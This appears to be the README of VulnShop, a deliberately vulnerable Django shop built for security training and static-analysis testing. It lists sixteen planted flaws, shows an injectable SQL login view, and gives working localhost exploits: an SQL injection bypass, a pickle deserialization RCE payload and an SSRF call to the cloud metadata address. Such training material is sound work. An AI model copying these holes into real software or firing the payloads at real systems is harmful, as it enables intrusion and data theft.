# VulnShop - Intentionally Vulnerable E-commerce Application

> **WARNING**: This application contains deliberate security vulnerabilities for educational and security testing purposes. **DO NOT** deploy in production or use with real data.

## Overview

VulnShop is a deliberately vulnerable Django e-commerce application designed for:

- **Security Training**: Learn to identify and exploit common web vulnerabilities
- **Taint Analysis Testing**: Validate static analysis tools (Pysa, CodeQL, Semgrep)
- **Penetration Testing Practice**: Practice ethical hacking in a safe environment

## Vulnerabilities

| ID | Vulnerability | CWE | OWASP 2021 | Severity | Location |
|----|---------------|-----|------------|----------|----------|
| V01 | SQL Injection (Auth) | CWE-89 | A03 | Critical | `authentication/views.py` |
| V02 | SQL Injection (Search) | CWE-89 | A03 | High | `catalog/views.py` |
| V03 | XSS Reflected | CWE-79 | A03 | Medium | `catalog/views.py` |
| V04 | XSS Stored | CWE-79 | A03 | High | `reviews/views.py` |
| V05 | Command Injection | CWE-78 | A03 | Critical | `admin_panel/views.py` |
| V06 | Path Traversal | CWE-22 | A01 | High | `admin_panel/views.py` |
| V07 | IDOR | CWE-639 | A01 | High | `profile/views.py` |
| V08 | Mass Assignment | CWE-915 | A04 | High | `profile/views.py` |
| V09 | SSRF | CWE-918 | A10 | High | `webhooks/views.py` |
| V10 | Insecure Deserialization | CWE-502 | A08 | Critical | `cart/views.py` |
| V11 | SSTI | CWE-1336 | A03 | Critical | `notifications/views.py` |
| V12 | Hardcoded Secrets | CWE-798 | A02 | High | `vulnshop/settings.py` |
| V13 | Vulnerable Dependencies | CWE-1035 | A06 | Variable | `requirements.txt` |
| V14 | Sensitive Data Logging | CWE-532 | A09 | Medium | `middleware/logging.py` |
| V15 | XXE | CWE-611 | A05 | High | `api/views.py` |
| V16 | Brute Force | CWE-307 | A07 | Medium | `authentication/views.py` |

## Quick Start

### Using Docker (Recommended)

```bash
# From the project root
docker-compose up -d vulnshop

# Access at http://localhost:8000
```

### Local Development

```bash
# Create virtual environment
python -m venv venv
source venv/bin/activate  # Linux/Mac
# or: .\venv\Scripts\activate  # Windows

# Install dependencies
pip install -r requirements.txt

# Run migrations
python manage.py migrate

# Load sample data
python manage.py loaddata fixtures/initial_data.json

# Create superuser
python manage.py createsuperuser

# Run server
python manage.py runserver
```

## Taint Analysis

Each vulnerability is documented with:

- **Taint Source**: Where untrusted data enters
- **Taint Sink**: Where the data causes harm
- **Propagation Path**: How data flows from source to sink

### Example: SQL Injection (V01)

```python
# authentication/views.py

def login_view(request):
    """
    VULNERABILITY V01: SQL Injection
    CWE-89: Improper Neutralization of Special Elements in SQL Command

    Taint Flow:
        Source: request.POST['username']
        Propagation: f-string formatting
        Sink: cursor.execute()
    """
    username = request.POST.get('username', '')  # SOURCE

    query = f"SELECT * FROM auth_user WHERE username = '{username}'"

    with connection.cursor() as cursor:
        cursor.execute(query)  # SINK
```

## Exploitation Examples

### V01: SQL Injection

```bash
# Authentication bypass
curl -X POST http://localhost:8000/auth/login/ \
  -d "username=admin'--&password=anything"
```

### V10: Insecure Deserialization (RCE)

```python
# Generate malicious payload
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### V09: SSRF

```bash
# Access internal services
curl -X POST http://localhost:8000/webhooks/test/ \
  -d "url=http://169.254.169.254/latest/meta-data/"
```

## Project Structure

```
vulnerable-app/
├── vulnshop/           # Main Django project (V12)
├── authentication/     # User auth (V01, V16)
├── catalog/            # Products (V02, V03)
├── reviews/            # Reviews (V04)
├── cart/               # Shopping cart (V10)
├── payment/            # Payments
├── profile/            # User profiles (V07, V08)
├── admin_panel/        # Admin tools (V05, V06)
├── webhooks/           # Webhooks (V09)
├── notifications/      # Notifications (V11)
├── api/                # REST API (V15)
├── middleware/         # Custom middleware (V14)
├── templates/          # HTML templates
├── static/             # CSS, JS, images
├── fixtures/           # Sample data
└── requirements.txt    # Dependencies (V13)
```

## Security Notice

This application is **intentionally insecure**. It is designed for:

- ✅ Security education
- ✅ Penetration testing practice
- ✅ Static analysis tool validation
- ✅ CTF challenges

It should **NEVER** be:

- ❌ Deployed to production
- ❌ Connected to real databases
- ❌ Used with real user data
- ❌ Exposed to the internet

## License

MIT License - See [LICENSE](../LICENSE) for details.

## Acknowledgments

- [OWASP](https://owasp.org/) - Vulnerability classifications
- [PortSwigger](https://portswigger.net/) - Web security academy
- [Django](https://www.djangoproject.com/) - Web framework
